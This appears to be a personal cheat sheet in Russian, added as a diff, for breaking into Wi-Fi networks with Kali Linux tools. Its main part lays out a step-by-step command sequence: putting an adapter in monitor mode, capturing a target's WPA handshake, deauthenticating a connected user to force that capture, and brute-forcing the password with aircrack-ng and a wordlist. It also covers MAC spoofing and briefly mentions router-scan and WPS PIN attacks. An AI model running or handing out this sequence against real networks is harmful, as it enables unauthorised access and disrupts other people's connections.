@@ -1,0 +1,63 @@
+Хеншейк- типо запрос на подключение с паролем.Наша задача его перехватить и расшифровать подобрав пароль.
+
+ip a					и то и то
+iwconfig 				вайфай адаптеры
+ifconfig 				интернет соединения
+
+
+sudo netdiscover  -r qq/24    like how use our network аля анализатор кто с нами в сети
+sudo ifconfig wlan0 up			 on/off wifi down	велюч/вык инет
+lshw					show all data about configure system	вся инфа о сист
+
+sudo ifconfig eth0 qqq19     		поменять ip внутрений
+sudo ifconfig eth0 hw ether qqqq9	поменять мак
+
+df -h					show memory valumes
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+0)
+sudo wifiti
+sudo wifite --dict /home/kali/Desktop/doc.txt           
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+1)
+
+iwconfig 													посмотреть вайвай адаптеры
+
+sudo airmon-ng check kill      											убивает лишние процесы          
+
+
+sudo airmon-ng start wlan0 											включ режим монитора 
+
+sudo airodump-ng wlan0mon 											скандируем сети и на основе мак адреса
+
+sudo airodump-ng --bssid qqqqq7 --channel 4 -w /home/kali/Desktop/testwifiHansh wlan0  		пытаемься захватить хеншейк и если гнадо можем отклч пол
+
+sudo  aireplay-ng --deauth 20 -a qqqq7 -c qqqqq8  wlan0					отключить пользователя 
+
+
+	После того как хеншейк захвачен его нужно почистить и расшифровать
+
+sudo wpaclean /home/kali/Desktop/testwifiHansh/clean_HAND.cap /home/kali/Desktop/testwifiHansh/testwifiHansh-02.cap 	чистим
+
+sudo aircrack-ng -w /home/kali/Desktop/doc.txt -b qqqqq /home/kali/Desktop/testwifiHansh/clean_HAND.cap	расшифровываем брутфорсом указав мак адрес и хенш
+
+
+	или можем расшифровать с псмошью hashcat
+Для этого чистить не нужно
+
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+2)
+Подключение к роутеру и там смотрим пароль
+https://www.youtube.com/watch?v=MCyYlHQILcs&t=436s
+Router Scan
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+3) на основе пина (WPS)
+
+
+
